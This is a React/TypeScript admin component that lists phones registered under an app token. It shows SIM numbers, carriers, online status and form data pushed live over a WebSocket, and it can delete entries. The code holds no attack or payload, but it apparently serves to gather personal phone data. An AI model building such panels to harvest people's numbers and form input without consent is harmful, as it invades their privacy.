import { useState, useEffect, useCallback, useRef } from "react";
import {
  ArrowLeft, RefreshCw, Trash2,
  Smartphone, Wifi, Search, Radio, ChevronDown, ChevronRight, Settings2
} from "lucide-react";
import Badge from "@/components/Badge";
import StatCard from "@/components/StatCard";
import type { AdminApp, Device } from "@/lib/types";
import { getDevices, deleteDevice, calcStats } from "@/lib/supabase";

interface AppDetailProps {
  app: AdminApp;
  onBack: () => void;
}

type FilterType = "all" | "online" | "offline";

function mergeDevice(list: Device[], updated: Device): Device[] {
  const idx = list.findIndex((d) => d.sub_id === updated.sub_id);
  if (idx === -1) return [updated, ...list];
  const next = [...list];
  next[idx] = { ...list[idx], ...updated };
  return next;
}

const isSystemEntry = (d: Device) => d.sub_id.startsWith("admin_");

export default function AppDetail({ app, onBack }: AppDetailProps) {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<FilterType>("all");
  const [busyId, setBusyId] = useState<string | null>(null);
  const [wsConnected, setWsConnected] = useState(false);
  const [showSystem, setShowSystem] = useState(false);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const wsRef = useRef<WebSocket | null>(null);

  const load = useCallback(async () => {
    setLoading(true); setError("");
    try { setDevices(await getDevices(app.token)); }
    catch (e: unknown) { setError(e instanceof Error ? e.message : "Error"); }
    finally { setLoading(false); }
  }, [app.token]);

  useEffect(() => { void load(); }, [load]);

  useEffect(() => {
    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${proto}//${window.location.host}/api/device/${app.token}/ws`;
    let ws: WebSocket;
    let reconnectTimer: ReturnType<typeof setTimeout>;

    const connect = () => {
      ws = new WebSocket(wsUrl);
      wsRef.current = ws;
      ws.onopen = () => setWsConnected(true);
      ws.onclose = () => { setWsConnected(false); reconnectTimer = setTimeout(connect, 4000); };
      ws.onerror = () => ws.close();
      ws.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data as string) as { event: string; data: unknown };
          if (msg.event === "device:updated" || msg.event === "device:form_data") {
            const d = msg.data as Device;
            if (d?.sub_id) setDevices((prev) => mergeDevice(prev, d));
          } else if (msg.event === "device:deleted") {
            const uid = (msg.data as { sub_id?: string })?.sub_id;
            if (uid) setDevices((prev) => prev.filter((x) => x.sub_id !== uid));
          }
        } catch { /* noop */ }
      };
    };

    connect();
    return () => { clearTimeout(reconnectTimer); ws?.close(); };
  }, [app.token]);

  const handleDelete = async (uid: string) => {
    if (!confirm(`Delete ${uid}?`)) return;
    setBusyId(uid);
    try {
      await deleteDevice(app.token, uid);
      setDevices((p) => p.filter((x) => x.sub_id !== uid));
    } catch (e: unknown) { alert(e instanceof Error ? e.message : "Error"); }
    finally { setBusyId(null); }
  };

  const now = Date.now();
  const isOnline = (d: Device) => {
    const t = d.data_json?.online_checked_at ?? 0;
    return t > 0 && now - t < 15 * 60 * 1000;
  };

  const fmt = (ts?: number) => {
    if (!ts || ts === 0) return "—";
    return new Date(ts).toLocaleString("en-IN", { day: "numeric", month: "short", hour: "2-digit", minute: "2-digit" });
  };

  // Split real devices vs system entries
  const realDevices = devices.filter((d) => !isSystemEntry(d));
  const systemEntries = devices.filter((d) => isSystemEntry(d));

  const filtered = realDevices.filter((d) => {
    const q = search.toLowerCase();
    const matchSearch =
      !q ||
      [d.sub_id, d.data_json?.device_name, d.data_json?.model,
       d.data_json?.brand, d.data_json?.sim1number, d.data_json?.sim2number]
        .some((v) => v?.toLowerCase().includes(q));
    const online = isOnline(d);
    const matchFilter =
      filter === "all" ? true : filter === "online" ? online : !online;
    return matchSearch && matchFilter;
  });

  const stats = calcStats(realDevices);

  return (
    <div className="flex-1 overflow-auto h-full bg-[#080c16]">
      {/* Top bar */}
      <div className="sticky top-0 z-10 bg-[#080c16]/90 backdrop-blur border-b border-slate-800/60 h-14 flex items-center gap-2 px-3 sm:px-6">
        <button onClick={onBack}
                className="p-1.5 rounded-lg hover:bg-slate-800 text-slate-500 hover:text-white transition-colors flex-shrink-0">
          <ArrowLeft className="w-4 h-4" />
        </button>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-1.5 flex-wrap">
            <h1 className="text-sm font-semibold text-white truncate max-w-[130px] sm:max-w-none">{app.label || app.token}</h1>
            <Badge variant={app.is_active ? "active" : "inactive"} />
            <span className={`flex items-center gap-1 text-[10px] px-1.5 py-0.5 rounded-full ${
              wsConnected ? "bg-emerald-900/30 text-emerald-400" : "bg-slate-800 text-slate-600"
            }`}>
              <Radio className={`w-2.5 h-2.5 ${wsConnected ? "animate-pulse" : ""}`} />
              {wsConnected ? "Live" : "Off"}
            </span>
          </div>
        </div>
        <button onClick={load} disabled={loading}
                className="p-1.5 rounded-lg hover:bg-slate-800 text-slate-500 hover:text-white transition-colors disabled:opacity-50">
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
        </button>
      </div>

      <div className="p-3 sm:p-6 space-y-3">
        {loading && devices.length === 0 ? (
          <div className="flex items-center justify-center py-24 text-slate-600">
            <span className="w-5 h-5 border-2 border-slate-700 border-t-blue-500 rounded-full animate-spin mr-2" />
            <span className="text-sm">Loading…</span>
          </div>
        ) : error ? (
          <div className="text-center py-16 bg-[#0d1220] border border-slate-800 rounded-2xl">
            <p className="text-sm text-red-400 mb-2">{error}</p>
            <button onClick={load} className="text-xs text-blue-400 hover:text-blue-300">Retry</button>
          </div>
        ) : (
          <>
            {/* Stats */}
            <div className="grid grid-cols-2 gap-2">
              <StatCard label="Devices" value={stats.total}  icon={Smartphone} color="blue" />
              <StatCard label="Online"  value={stats.online} icon={Wifi}        color="green" />
            </div>

            {/* Search + Filter */}
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-600 pointer-events-none" />
              <input value={search} onChange={(e) => setSearch(e.target.value)}
                     placeholder="Search by ID, device, SIM…"
                     className="w-full bg-[#0d1220] border border-slate-800 rounded-xl pl-9 pr-4 py-2 text-sm placeholder-slate-700 text-white focus:outline-none focus:border-blue-500/50 transition-colors" />
            </div>

            <div className="flex gap-1.5 items-center">
              {(["all", "online", "offline"] as FilterType[]).map((f) => (
                <button key={f} onClick={() => setFilter(f)}
                        className={`px-3 py-1.5 rounded-lg text-xs font-medium capitalize transition-colors ${
                          filter === f ? "bg-blue-600 text-white" : "bg-[#0d1220] border border-slate-800 text-slate-500 hover:text-slate-300"
                        }`}>{f}</button>
              ))}
              <span className="ml-auto text-xs text-slate-600">{filtered.length} devices</span>
            </div>

            {/* Real device list */}
            {filtered.length === 0 ? (
              <div className="text-center py-12 bg-[#0d1220] border border-slate-800 rounded-2xl">
                <Smartphone className="w-7 h-7 mx-auto text-slate-700 mb-3" />
                <p className="text-sm text-slate-600">No devices found.</p>
              </div>
            ) : (
              <div className="space-y-2">
                {filtered.map((d) => {
                  const dj = d.data_json ?? {};
                  const online = isOnline(d);
                  const busy = busyId === d.sub_id;
                  const deviceLabel = dj.device_name || dj.model || dj.brand || null;
                  const simInfo = dj.sim1number
                    ? `${dj.sim1number}${dj.sim1carrier ? ` · ${dj.sim1carrier}` : ""}`
                    : null;

                  return (
                    <div key={d.sub_id}
                         className="bg-[#0d1220] border border-slate-800/80 rounded-2xl px-3 sm:px-4 py-3">
                      <div className="flex items-start gap-2.5">
                        <div className={`w-8 h-8 rounded-xl flex items-center justify-center flex-shrink-0 mt-0.5 ${
                          online ? "bg-emerald-900/20" : "bg-slate-800"
                        }`}>
                          <Smartphone className={`w-4 h-4 ${online ? "text-emerald-400" : "text-slate-500"}`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-1.5 flex-wrap">
                            <span className="font-mono text-xs sm:text-sm text-white font-semibold truncate max-w-[160px] sm:max-w-none">{d.sub_id}</span>
                            <Badge variant={online ? "online" : (dj.online_status === "offline" ? "offline" : "unknown")} pulse={online} />
                          </div>
                          <div className="flex flex-wrap gap-x-2 gap-y-0.5 mt-0.5 text-xs text-slate-500">
                            {deviceLabel && <span className="truncate max-w-[200px]">{deviceLabel}</span>}
                            {simInfo && <span className="font-mono">{simInfo}</span>}
                          </div>
                          <p className="text-[10px] text-slate-600 mt-0.5">
                            Joined {fmt(d.registered_at ?? d.created_at)}
                            {dj.last_seen_at ? ` · Seen ${fmt(dj.last_seen_at)}` : ""}
                          </p>
                        </div>
                        <button onClick={() => void handleDelete(d.sub_id)} disabled={busy}
                                className="p-1.5 rounded-lg hover:bg-red-900/25 text-slate-700 hover:text-red-400 transition-colors disabled:opacity-50 flex-shrink-0 mt-0.5">
                          {busy
                            ? <span className="w-3.5 h-3.5 border border-slate-500/30 border-t-slate-500 rounded-full animate-spin block" />
                            : <Trash2 className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* System Entries section */}
            {systemEntries.length > 0 && (
              <div className="pt-1">
                <button
                  onClick={() => setShowSystem((v) => !v)}
                  className="w-full flex items-center gap-2 px-3 py-2 rounded-xl bg-[#0d1220] border border-slate-800/60 hover:border-slate-700 transition-colors text-left"
                >
                  <Settings2 className="w-3.5 h-3.5 text-slate-500 flex-shrink-0" />
                  <span className="text-xs font-medium text-slate-400 flex-1">
                    System Entries ({systemEntries.length})
                  </span>
                  <span className="text-[10px] text-slate-600">tap to {showSystem ? "hide" : "view"}</span>
                  {showSystem
                    ? <ChevronDown className="w-3.5 h-3.5 text-slate-600" />
                    : <ChevronRight className="w-3.5 h-3.5 text-slate-600" />}
                </button>

                {showSystem && (
                  <div className="mt-2 space-y-2">
                    {systemEntries.map((d) => {
                      const isExpanded = expandedId === d.sub_id;
                      const raw = d.data_json as unknown as Record<string, unknown> ?? {};
                      const busy = busyId === d.sub_id;
                      return (
                        <div key={d.sub_id}
                             className="bg-[#0d1220] border border-slate-700/50 rounded-xl overflow-hidden">
                          <button
                            onClick={() => setExpandedId(isExpanded ? null : d.sub_id)}
                            className="w-full flex items-center gap-2.5 px-3 py-2.5 hover:bg-slate-800/30 transition-colors text-left"
                          >
                            <Settings2 className="w-3.5 h-3.5 text-slate-600 flex-shrink-0" />
                            <span className="font-mono text-xs text-slate-400 flex-1 truncate">{d.sub_id}</span>
                            <button
                              onClick={(e) => { e.stopPropagation(); void handleDelete(d.sub_id); }}
                              disabled={busy}
                              className="p-1 rounded hover:bg-red-900/25 text-slate-700 hover:text-red-400 transition-colors"
                            >
                              {busy
                                ? <span className="w-3 h-3 border border-slate-500/30 border-t-slate-500 rounded-full animate-spin block" />
                                : <Trash2 className="w-3 h-3" />}
                            </button>
                            {isExpanded
                              ? <ChevronDown className="w-3.5 h-3.5 text-slate-600 flex-shrink-0" />
                              : <ChevronRight className="w-3.5 h-3.5 text-slate-600 flex-shrink-0" />}
                          </button>

                          {isExpanded && (
                            <div className="border-t border-slate-800/60 px-3 py-3">
                              {Object.keys(raw).length === 0 ? (
                                <p className="text-xs text-slate-600">No data stored.</p>
                              ) : (
                                <div className="space-y-1.5">
                                  {Object.entries(raw).map(([k, v]) => (
                                    <div key={k} className="flex items-start gap-2">
                                      <span className="text-[10px] font-mono text-slate-600 flex-shrink-0 min-w-[100px] pt-0.5">{k}</span>
                                      <span className="text-xs font-mono text-slate-300 break-all select-all">
                                        {typeof v === "object" ? JSON.stringify(v) : String(v ?? "")}
                                      </span>
                                    </div>
                                  ))}
                                </div>
                              )}
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
}
